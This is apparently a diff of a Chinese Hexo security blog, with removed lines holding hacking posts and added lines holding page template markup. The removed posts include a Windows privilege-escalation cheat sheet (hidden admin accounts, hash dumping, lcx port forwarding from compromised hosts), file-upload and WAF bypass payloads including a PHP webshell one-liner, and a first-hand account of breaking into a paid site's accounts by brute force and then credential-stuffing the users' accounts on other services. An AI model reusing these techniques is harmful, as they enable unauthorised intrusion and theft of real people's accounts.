-<h2 id="提权攻略"><a href="#提权攻略" class="headerlink" title="提权攻略"></a>提权攻略</h2><p>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user<br>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。<br>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。<br>4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。<br>5.创建用户：net user username password ／add；设置为管理员：net localgroup administrators username ／add；如果要把用户设置成隐藏的用户，你可以在username后面加一个‘$’字符。<br>6.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！<br>7.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”<br>8.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。<br>9.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。<br>10.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程<br>11.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。<br>12.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。<br>13.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。<br>14.当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:\Documents and Settings\All Users\Application Data\Microsoft 目录 然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～1<br>15.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators<br>16.进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin<br>17.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:\xxx\exp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。<br>18.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现<br>19.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe &gt;1.txt<br>20.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe<br>21.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。 上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs<br>22.如何辨别服务器是不是内网？ 192.168.x.x 172.16.x.x 10.x.x.x</p>
-<hr>
-<h2 id="lcx使用手册"><a href="#lcx使用手册" class="headerlink" title="lcx使用手册"></a>lcx使用手册</h2><p> lcx.exe是个端口转发工具,相当于把肉鸡A上的3389端口转发到B机上,当然这个B机必须有外网IP.这样链接B机的3389度端口就相当于链接A机的3389. </p>
-<p> 下面就先详细讲解下LXC转发工具与使用方法：<br>如在本机B上监听 -listen 51 3389，在肉鸡A上运行-slave<br>本机ip 51 肉鸡ip 3389 那么在本地连127.0.0.1就可以连肉鸡的3389.第二条是本机转向。<br>例:现在有一个ip为222.221.221.22的websehll.用端口扫描发现开放了3389端口<br>可是我们输入外网IP可是不能正常链接。那么很有可能就是内网服务器。我们cmd（terminal）执行ipconfig（ifconfig）可以看出是否是内网服务器<br>上传lcx.exe到肉鸡 然后 cx.exe -listen 51 3389 意思是监听51端口并转发到3389端口。<br>显示如下[+] Listening port 51 ……<br>[+] Listen OK!<br>[+] Listening port 3389 ……<br>[+] Listen OK!<br>[+] Waiting for Client on port:51 ……<br> 然后在肉鸡上运行 lcx.exe -slave 你的IP 51 222.221.221.22 3389<br>222.221.221.22是我举例用的肉鸡IP.换成你的..运行以后本机监听端口。</p>
-<p>显示如下信息</p>
-<p>[+] Listening port 51 ……<br>[+] Listen OK!<br>[+] Listening port 3389 ……<br>[+] Listen OK!<br>[+] Waiting for Client on port:51 ……<br>[+] Accept a Client on port 55 from 222.221.221.22 ……<br>[+] Waiting another Client on port:3389….</p>
-<p>好了.现在在自己机子上链接 127.0.0.1 或者输你自己IP.<br>发现进去的不是自己机子,(或者自己机子根本连不上),而是肉鸡A了!优点,搞定内网肉鸡.<br>缺点,有点麻烦,而且每次都要通过sqltools先进行端口转发.当然也可以用反弹木马控制肉鸡</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 攻略 </category>
-            
-        </categories>
-        
-        
-    </entry>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一頁</a>
     
-    <entry>
-      <title><![CDATA[文件上传的那些事（下）]]></title>
-      <url>http://www.warmeng.com/2017/04/12/the_upload(l)/</url>
-      <content type="html"><![CDATA[<p>绕过！<br><a href="http://thief.one/" target="_blank" rel="external">nmask</a></p>
-<a id="more"></a>
-<h1 id="各种文件上传绕过姿势"><a href="#各种文件上传绕过姿势" class="headerlink" title="各种文件上传绕过姿势"></a>各种文件上传绕过姿势</h1><h2 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h2><p>可以利用bp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
-<h2 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h2><h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>通过bp抓包，将content-type字段改为image/gif</p>
-<h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a&lt;?php phpinfo(); ?&gt;</p>
-<h3 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h3><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp jspx jspf<br>asp asa cer aspx<br>php php php3 php4<br>exe exee</p>
-<h2 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h2><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验</p>
-<h2 id="配合解析漏洞"><a href="#配合解析漏洞" class="headerlink" title="配合解析漏洞"></a>配合解析漏洞</h2><p>详情请看文件上传（上）</p>
-<h2 id="配合操作系统文件命名规则"><a href="#配合操作系统文件命名规则" class="headerlink" title="配合操作系统文件命名规则"></a>配合操作系统文件命名规则</h2><p>（1）上传不符合windows文件命名规则的文件名<br>　　test.asp.<br>　　test.asp(空格)<br>　　test.php:1.jpg<br>　　test.php::$DATA<br>　　shell.php::$DATA…….<br>会被windows系统自动去掉不符合规则符号后面的内容。<br>（2）linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
-<h2 id="配合其他规则"><a href="#配合其他规则" class="headerlink" title="配合其他规则"></a>配合其他规则</h2><p>   0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</p>
-<hr>
-<h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><h2 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h2><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<br><img src="/images/upload/1.png" alt=""><br>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。<br><img src="/images/upload/2.png" alt=""><br>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
-<h2 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h2><p>针对早期版本安全狗，可以多加一个filename<br><img src="/images/upload/3.png" alt=""><br>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src="/images/upload/4.png" alt=""></p>
-<h2 id="post-get"><a href="#post-get" class="headerlink" title="post/get"></a>post/get</h2><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
-<h2 id="利用waf本身"><a href="#利用waf本身" class="headerlink" title="利用waf本身"></a>利用waf本身</h2><p>删除实体里面的Conten-Type字段<br><img src="/images/upload/5.png" alt=""><br>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。<br>删除Content-Disposition字段里的空格<br><img src="/images/upload/6.png" alt=""><br>增加一个空格导致安全狗被绕过案列：<br>Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099<br>尝试在boundary后面加个空格或者其他可被正常处理的字符：<br>boundary= —————————47146314211411730218525550<br>修改Content-Disposition字段值的大小写<br><img src="/images/upload/7.png" alt=""><br>文件名处回车<br><img src="/images/upload/8.png" alt=""></p>
-<h2 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h2><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><img src="/images/upload/9.png" alt=""></p>
-<hr>
-<p>文章出处：<br><a href="http://thief.one/" target="_blank" rel="external">文件上传漏洞(绕过姿势)| nMask’Blog</a><br><a href="https://xianzhi.aliyun.com/forum/read/458.html?fpage=2" target="_blank" rel="external">tools大牛</a></p>
-]]></content>
-      
-        <categories>
-            
-            <category> 攻略 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> gitshell </tag>
-            
-        </tags>
-        
-    </entry>
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <entry>
-      <title><![CDATA[文件上传的那些事（上）]]></title>
-      <url>http://www.warmeng.com/2017/04/09/the_upload(f)/</url>
-      <content type="html"><![CDATA[<p>文件上传的那些故事，不想在到网上搜着看了，是时候来汇总收集一波了，大部分内容由nmask大神博客转载！<br><a href="http://thief.one/" target="_blank" rel="external">nmask</a></p>
-<a id="more"></a>
-<hr>
-<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传是web应用中经常出现的功能，他允许用户上传文件到服务器并保存到特定的位置。这对安全来说是一个很敏感的问题，一旦恶意的应用程序被上传到服务器并获取到执行权限，后果将不堪设想。</p>
-<hr>
-<h2 id="文件上传先从解析漏洞开始"><a href="#文件上传先从解析漏洞开始" class="headerlink" title="文件上传先从解析漏洞开始"></a>文件上传先从解析漏洞开始</h2><h3 id="IIS5-X-IIS6-X"><a href="#IIS5-X-IIS6-X" class="headerlink" title="IIS5.X-IIS6.X"></a>IIS5.X-IIS6.X</h3><p>大多数用该容器的网站系统都是windows2003，用的脚本多为asp，一旦木马上传成功拥有较大的权限，该解析漏洞也只能asp文件，而不能解析aspx文件。<br>   目录解析：<br>  /xx.asp/xx.jpg<br>在网站下建立文件夹的名字为.asp,.asa,.cer的文件夹,该目录的任何扩展名的文件都被IIS当做asp文件来解析并且执行<br>   文件解析:<br>  xx.asp;.jgp<br>在IIS6.0下，分号后面的不被解析，也就是说在IIS6.0默认的可执行的文件中还包含xx.asa,xx.cer,xx.cdx这三种</p>
-<h3 id="iis-7-0-iis7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#iis-7-0-iis7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="iis 7.0/iis7.5/Nginx &lt;8.03畸形解析漏洞"></a>iis 7.0/iis7.5/Nginx &lt;8.03畸形解析漏洞</h3><p>在默认Fast-CGI开启的状况下，黑阔上传一个名字为wooyun.jpg，内容为&lt;?php fputs(‘shell.php’,’w’),’&lt;?php eval($_post[cmd]?)&gt;’);?&gt;的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马</p>
-<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>0.5，0.6,0.7&lt;=0.7.65&amp;&amp;08&lt;=0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问XXX.JPG%00.PHP来执行其中的代码<br>0.5.<em>&amp;&amp;0.6.</em>&amp;&amp;0.7&lt;=0.7.65&amp;&amp;0.8&lt;=0.8.37<br>在以上NGINX容器的版本下，上传一个在WAF白名单之内扩展名的文件shell.jpg,然后用shell.jpg.php警醒请求<br>0.8.041-1.5.6<br>在以上的NGINX容器的版本下，上传一个waf白名单之内扩展名的文件shell.jpg，然后用shell.jpg%20.php进行请求</p>
-<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>Apache是从右到左开始判断解析，如果为不可识别解析，就在往左边判断.比如说wooyun.php.owf.rar，后面两种后缀是apache不可识别解析的，apache就会把该文件解析成php，所以如何判断是不是合法的后缀就是这个漏洞的利用关键，测试时可以尝试上传一个wooyun.php.rara.xxx…..（反正就是随意填）去测试是否是合法的后缀</p>
-<p>##其他<br>如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>  如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
-<hr>
-<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>普通本地包含<br>&lt;?php include_once(&amp;_GET[‘f’]); ?&gt;</p>
-<p> Php?f=1.txt</p>
-<p>截断本地包含<br>Magic_quote_gpc为off的情况使用<br>Php?=1.txt%00</p>
-<p>长文件名截断</p>
-<p>&lt;?php  include_once($_GET[‘f’].”.php”); ?&gt;<br>Php?f=1.txt/././././././././././././././././././…………php</p>
-<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>这种默认情况下关闭的套路别用了，愁人！还有些什么session文件包含一句话什么的看不懂，暂时不研究。</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 攻略 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> gitshell </tag>
-            
-        </tags>
-        
-    </entry>
+    <a href="/2017/06/09/spider/" type="button" class="btn btn-default ">下一頁<i
+                class="fa fa-arrow-circle-o-right"></i></a>
     
-    <entry>
-      <title><![CDATA[通過黃色網站對用戶的社工]]></title>
-      <url>http://www.warmeng.com/2017/04/05/hweb/</url>
-      <content type="html"><![CDATA[<p>一次和龍灣大佬合作的的實戰記錄，這次的實戰過程給我一個警醒。</p>
-<p> 不管你的密碼是否複雜，永遠不要在所有的網站上使用同一個密碼。不然真的真的真的很危險。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–by warmeng and orleven</p>
-<a id="more"></a>
-<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>該黃色網站由某位廣告老司機發佈在群中，（由於博主還是一個純真的少年，這裡就不開車發網址了~）登陸該網址發現必須要買會員才能看裡面的資源，加入會員需要50塊錢的入會費，呵呵噠，我等屌絲窮逼什麼時候能承受這麼一筆天價巨款！！日站！！</p>
-<h2 id="信息收集與準備工作"><a href="#信息收集與準備工作" class="headerlink" title="信息收集與準備工作"></a>信息收集與準備工作</h2><p>cms版本：dizcus<br>腳本：php<br>系統：windows<br>容器：Nginx<br>各種滲透工具：burpsuite，awvs，nmap，dirsearch，御劍，龍灣大佬自製腳本（小型爬蟲）<br>註冊會員名單若干。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">$ </div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import threading</div><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">threads = []</div><div class="line">request = requests.session()</div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"</span></div><div class="line">header[<span class="string">"Content-Type"</span>] = <span class="string">"application/x-www-form-urlencoded"</span></div><div class="line">header[<span class="string">"Accept"</span>] = <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span></div><div class="line">header[<span class="string">"Accept-Language"</span>] = <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span></div><div class="line">header[<span class="string">"Accept-Encoding"</span>] = <span class="string">"gzip, deflate"</span></div><div class="line">header[<span class="string">"Cookie"</span>] = <span class="string">"UM_distinctid=15b376519ba53e-007c3d87be62c08-1262694a-144000-15b376519bb462; CNZZDATA1261494228=831009649-1491280862-%7C1491291663; Ytbs_2132_saltkey=HHsNZ9Hr; Ytbs_2132_lastvisit=1491285722; Ytbs_2132_sid=BICooo; Ytbs_2132_lastact=1491293284%09misc.php%09patch; Ytbs_2132_home_diymode=1; Ytbs_2132_sendmail=1; Ytbs_2132_ulastactivity=816dDp017aWFAasznplKs9EHKYb9Od2auDpLW0iBm%2FTWqLOzFZVV; Ytbs_2132_auth=459esi4d2DZpue0D6iCJsczCsnO4LrzJk6UAT4CEFtTS4hentR2om0QocI2q1ojqlszIzumjgzg1TBrNrpYJWXSl%2FQ; Ytbs_2132_lastcheckfeed=46107%7C1491293279; Ytbs_2132_checkfollow=1; Ytbs_2132_lip=183.157.172.91%2C1491284503; Ytbs_2132_checkpm=1; Ytbs_2132_noticeTitle=1; tjpctrl=1491295070306"</span></div><div class="line">indexUrl = <span class="string">"http://www.lolibus.com/?"</span></div><div class="line"></div><div class="line"></div><div class="line">def index(num,indexUrl):</div><div class="line">    <span class="keyword">for</span> userid <span class="keyword">in</span> xrange(num * 5000, ( num +1) * 5000 ):</div><div class="line">        try:</div><div class="line">            targetUrl = indexUrl + str(userid)</div><div class="line">            results = request.get(targetUrl,headers=header)</div><div class="line">            <span class="comment"># print results.content</span></div><div class="line">            <span class="keyword">if</span> <span class="string">"待推广会"</span> not <span class="keyword">in</span>  results.content:</div><div class="line">                username = str(BeautifulSoup(results.content).title)</div><div class="line">                username = username[7:username.find(<span class="string">"的个人资料"</span>)]</div><div class="line">                <span class="built_in">print</span> username</div><div class="line">        except:</div><div class="line">            <span class="comment"># print "[-] Not Available !"</span></div><div class="line">            pass</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(0,10):</div><div class="line">        t =  threading.Thread(target=index,args=(num,indexUrl,))</div><div class="line">        t.start()</div><div class="line">        threads.append(t)</div></pre></td></tr></table></figure></p>
-<h2 id="滲透思路與過程"><a href="#滲透思路與過程" class="headerlink" title="滲透思路與過程"></a>滲透思路與過程</h2><p>找對應cms公開的漏洞———-失敗！完全不會這個，從來沒有成功過關<br>掃描端口以及對應後台———-成功！掃出一個wdcp登陸的後台<br>爆破管理與賬號密碼———–失敗，并被鎖定ip！<br>註冊用戶———-失敗，交50塊錢的入會費，交不起！<br>爆破正式會員的弱口令———-成功！各種小電影隨便看！<br>越權漏洞———–成功！觀看任意用戶的用戶名！<br>通過正式會員修改頭像方式文件上傳————失敗！網頁白名單限制，沒有解析漏洞，也沒有通過截斷上傳！<br>通過正式會員修改個人資料及發送消息進行XSS攻擊———–失敗！XSS並不是很熟練，但是也看出該網站對XSS進行了過濾！<br>滲透方面，并咩有找到什麼能getshell的辦法，很氣，怎麼辦，我也很絕望！</p>
-<hr>
-<p>滲透沒有什麼突破，但是獲得了一個很重要的信息，我們能通過越權看到任意用戶的用戶名  xxxx?id=x  的url形式，我們只需要通過修改x的值就能得到任意用戶的用戶名，得到用戶名，進行批量的爆破，由此可證，量變引起質變。用龍灣大佬自製的腳本對正式會員用戶進行爬取<br><img src="/images/20170405/1.png" alt=""></p>
-<hr>
-<p>發現到用戶登錄的地方沒有驗證碼的限制，但是有登錄錯誤次數的限制<br><img src="/images/20170405/2.png" alt=""></p>
-<hr>
-<p>發現該網站用戶登錄的登錄限制是通過ip和用戶名一起的,即同一個用戶和同一個IP地址只能輸入5次,但是IP的限制我們可以通過修改X-Forwarded-For的方式繞過,用戶名就沒有辦法羅！<br><img src="/images/20170405/3.png" alt=""></p>
-<hr>
-<p>思考階段，我們隊爬取出來的用戶表進行了分析，如果用戶名是英文的尤其是那種幾個字母加上數字及其有可能用戶名==密碼。由此爆破出很多正式用後的賬號密碼，盜號成功！登錄！<br>人人網，12306，網易郵箱，支付寶，淘寶，京東，智聯，趕集全部撞庫成功！由於支付寶，淘寶等需要手機驗證，不會繞過，就此作罷。<br><img src="/images/20170405/10.png" alt=""><br><img src="/images/20170405/11.png" alt=""></p>
-<hr>
-<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>博主還只是小菜狗一隻，需要更強大的技術來getshell，來入侵，希望得到更多大佬的指點與解惑。通過這次也警醒了大家要慎重的考慮自己的密碼。</p>
-]]></content>
-      
-        <categories>
-            
-            <category> 实战过程 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 社工 </tag>
-            
-            <tag> 实战 </tag>
-            
-        </tags>
-        
-    </entry>
+
     
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+    <div class="ds-thread" data-thread-key="2017/07/01/pypypy/" data-title="自制python小工具"
+         data-url="http://www.warmeng.com/2017/07/01/pypypy/"></div>
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-07-01 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/杂项/">杂项<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/python/">python<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+<script type="text/javascript">
+  var duoshuoQuery = { short_name: 'true' };
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';
+    ds.async = true;
+    ds.src = 'http://static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>    次
+</span>
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2017 Mr.w
   
+
+  <!--
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.    -->
+</p>
+<span id="busuanzi_container_site_uv"> 
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span> </footer>
+</div> <!-- container-narrow -->
   
-</search>
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
